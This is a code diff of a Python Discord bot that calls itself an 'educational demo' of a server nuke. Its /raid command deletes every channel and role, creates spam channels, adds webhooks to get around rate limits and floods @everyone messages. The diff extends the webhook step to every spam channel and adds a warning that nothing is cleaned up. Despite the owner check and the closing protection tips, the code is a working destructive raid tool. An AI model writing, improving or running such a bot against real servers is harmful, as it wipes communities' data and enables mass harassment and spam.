@@ -2,7 +2,7 @@ import discord
 from discord.ext import commands
 import asyncio
 import time
-import os  # <-- IMPORT OS
+import os
 
 # ========== CONFIGURATION ==========
 TOKEN = os.getenv("DISCORD_TOKEN")
@@ -16,12 +16,10 @@ active_demo = {}
 
 @bot.event
 async def on_ready():
-    await bot.tree.sync()  # Sync slash commands globally
+    await bot.tree.sync()
     print(f"✅ Educational Demo Bot ready - {bot.user}")
     print(f"Owner ID: {OWNER_ID}")
-    print(f"Slash commands registered: /raid, /stopraid, /protect, /commands")
-
-# ========== SLASH COMMANDS ==========
+    print(f"Slash commands: /raid, /stopraid, /protect, /commands")
 
 @bot.tree.command(name="raid", description="[OWNER ONLY] Educational nuke demonstration")
 async def raid(
@@ -30,15 +28,13 @@ async def raid(
     ping: str = "no",
     amount: int = 10
 ):
-    """Educational demo - shows what a nuke bot does"""
-    
     if interaction.user.id != OWNER_ID:
         return await interaction.response.send_message("❌ Only the bot owner can run this educational demo.", ephemeral=True)
     
     if not interaction.guild.me.guild_permissions.administrator:
         return await interaction.response.send_message("❌ Bot needs Administrator permission for this demo.", ephemeral=True)
     
-    await interaction.response.send_message("⚠️ **EDUCATIONAL DEMO STARTING** - Check this channel for updates...", ephemeral=False)
+    await interaction.response.send_message("⚠️ **EDUCATIONAL DEMO STARTING** - Watch this channel...", ephemeral=False)
     
     ping_enabled = ping.lower() in ['yes', 'y', 'true', '1']
     
@@ -61,11 +57,11 @@ async def raid(
             try:
                 await channel.delete()
                 await asyncio.sleep(0.1)
-            except:
-                pass
+            except Exception as e:
+                print(f"Failed to delete {channel.name}: {e}")
         
         await interaction.followup.send("✅ All channels deleted", ephemeral=False)
-        await asyncio.sleep(1)
+        await asyncio.sleep(2)
         
         # ========== PHASE 2: Create spam channels ==========
         await interaction.followup.send("📢 **PHASE 2: Creating spam channels...**", ephemeral=False)
@@ -75,14 +71,14 @@ async def raid(
             if not active_demo.get(guild.id):
                 break
             try:
-                channel = await guild.create_text_channel(f"nuked-{i}")
+                channel = await guild.create_text_channel(f"nuked-by-demo-{i}")
                 spam_channels.append(channel)
-                await asyncio.sleep(0.2)
-            except:
-                pass
+                await asyncio.sleep(0.3)
+            except Exception as e:
+                print(f"Failed to create channel {i}: {e}")
         
         await interaction.followup.send(f"✅ Created {len(spam_channels)} spam channels", ephemeral=False)
-        await asyncio.sleep(1)
+        await asyncio.sleep(2)
         
         # ========== PHASE 3: Delete all roles ==========
         await interaction.followup.send("📢 **PHASE 3: Destroying roles...**", ephemeral=False)
@@ -95,64 +91,69 @@ async def raid(
             try:
                 await role.delete()
                 await asyncio.sleep(0.1)
-            except:
-                pass
+            except Exception as e:
+                print(f"Failed to delete role {role.name}: {e}")
         
         await interaction.followup.send("✅ All roles destroyed", ephemeral=False)
-        await asyncio.sleep(1)
+        await asyncio.sleep(2)
         
         # ========== PHASE 4: Create webhooks ==========
         await interaction.followup.send("📢 **PHASE 4: Creating webhooks for spam...**", ephemeral=False)
         
-        for channel in spam_channels[:5]:
+        for channel in spam_channels:
             if not active_demo.get(guild.id):
                 break
             try:
                 for i in range(3):
                     await channel.create_webhook(name=f"spammer_{i}")
-                    await asyncio.sleep(0.2)
-            except:
-                pass
+                    await asyncio.sleep(0.3)
+            except Exception as e:
+                print(f"Failed to create webhook in {channel.name}: {e}")
         
         await interaction.followup.send("✅ Webhooks created", ephemeral=False)
-        await asyncio.sleep(1)
+        await asyncio.sleep(2)
         
         # ========== PHASE 5: Send spam messages ==========
-        await interaction.followup.send(f"📢 **PHASE 5: Sending {amount} messages per channel with ping={ping_enabled}...**", ephemeral=False)
+        await interaction.followup.send(f"📢 **PHASE 5: Sending {amount} messages per channel...**", ephemeral=False)
+        
+        ping_text = "@everyone " if ping_enabled else ""
         
         for channel in spam_channels:
             if not active_demo.get(guild.id):
                 break
             
-            ping_text = "@everyone " if ping_enabled else ""
+            await interaction.followup.send(f"💬 Spamming in #{channel.name}...", ephemeral=False)
             
             for i in range(min(amount, 100)):
                 if not active_demo.get(guild.id):
                     break
                 try:
                     await channel.send(f"{ping_text}{message} [{i+1}/{amount}]")
-                    await asyncio.sleep(0.3)
-                except:
-                    pass
+                    await asyncio.sleep(0.2)
+                except Exception as e:
+                    print(f"Failed to send message in {channel.name}: {e}")
+            
+            await asyncio.sleep(0.5)
         
         await interaction.followup.send("✅ Spam messages sent", ephemeral=False)
-        await asyncio.sleep(1)
+        await asyncio.sleep(2)
         
         # ========== Educational Summary ==========
         embed = discord.Embed(
             title="⚠️ EDUCATIONAL DEMO COMPLETE ⚠️",
             description=f"**What you just witnessed:**\n"
-                       f"1. 🔥 Channel Deletion - All channels wiped\n"
-                       f"2. 📁 Spam Channels - Malicious channels created\n"
-                       f"3. 👑 Role Destruction - Admin/Mod roles removed\n"
-                       f"4. 🕸️ Webhook Abuse - Bypassed rate limits\n"
+                       f"1. 🔥 Channel Deletion - All original channels wiped\n"
+                       f"2. 📁 Spam Channels - {len(spam_channels)} malicious channels created\n"
+                       f"3. 👑 Role Destruction - All admin/mod roles removed\n"
+                       f"4. 🕸️ Webhook Abuse - Webhooks created to bypass rate limits\n"
                        f"5. 💬 Mass Pinging - {amount} messages with {'@everyone' if ping_enabled else 'no pings'}\n\n"
                        f"**How to PROTECT your server:**\n"
                        f"• ✅ NEVER give Administrator to untrusted bots\n"
                        f"• ✅ Use 2FA on administrator accounts\n"
                        f"• ✅ Enable invite moderation and verification levels\n"
-                       f"• ✅ Use backup bots to save server structure\n\n"
-                       f"**This demo will end in 30 seconds...**",
+                       f"• ✅ Use backup bots (like Xenon) to save server structure\n"
+                       f"• ✅ Audit your server's bot list regularly\n\n"
+                       f"**This demo will end in 30 seconds. The bot will NOT clean up - you must restore from backup or delete this server.**",
             color=discord.Color.red()
         )
         await interaction.followup.send(embed=embed, ephemeral=False)
@@ -161,8 +162,10 @@ async def raid(
         
     except Exception as e:
         await interaction.followup.send(f"❌ Demo error: {e}", ephemeral=False)
+        print(f"Demo error: {e}")
     finally:
         active_demo[guild.id] = False
+        await interaction.followup.send("🛑 **Educational demo ended**", ephemeral=False)
 
 @bot.tree.command(name="stopraid", description="[OWNER ONLY] Emergency stop the educational demo")
 async def stopraid(interaction: discord.Interaction):
@@ -229,8 +232,6 @@ async def cmd_list(interaction: discord.Interaction):
     embed.set_footer(text="⚠️ Educational purposes only - Run only on test servers")
     
     await interaction.response.send_message(embed=embed, ephemeral=False)
-
-# ========== RUN BOT ==========
 
 if __name__ == "__main__":
     if not TOKEN:
